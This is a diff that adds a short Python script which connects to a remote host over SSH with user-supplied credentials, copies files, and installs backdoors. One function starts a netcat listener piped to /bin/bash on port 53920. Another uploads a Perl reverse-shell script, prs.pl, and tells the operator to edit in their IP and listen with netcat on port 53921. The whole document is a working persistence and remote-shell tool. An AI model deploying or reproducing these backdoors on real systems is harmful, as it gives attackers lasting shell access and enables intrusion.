@@ -1,0 +1,40 @@
+from paramiko import SSHClient
+from scp import SCPClient
+import paramiko
+
+def scpFiles(filename, recur=True):
+        scp.put(filename, recursive=recur)
+
+def netcatBackdoor():
+	ssh.exec_command("nohup mkfifo foo ; nc -lk 53920 0<foo | /bin/bash 1>foo &")
+	print("Netcat backdoor on port 53920 attempted.")
+
+def perlBackdoor():
+	raw_input("Please edit the prs.pl file to put in your ip. Press enter to continue.")
+	raw_input("Enter the following command: nc -v -n -l -p 53921. Press enter")
+	scpFiles('prs.pl', False)
+	print("Moving the backdoor script.")
+	ssh.exec_command("nohup perl prs.pl")
+	print("Perl backdoor on port 53921 attempted")
+
+hostname = raw_input('Hostname: ')
+port = 22;
+uname = raw_input('Username: ')
+pword = raw_input('Password: ')
+ssh = SSHClient()
+ssh.load_system_host_keys()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+ssh.connect(hostname, username=uname, password=pword)
+scp = SCPClient(ssh.get_transport())
+
+scpFiles('test/')
+if(raw_input('Press y to start a netcat backdoor') == 'y'):
+	netcatBackdoor()
+if(raw_input('Press y to start a perl backdoor') == 'y'):
+	perlBackdoor()
+
+raw_input('Press a key to close the program.')
+scp.close()
+
+
+
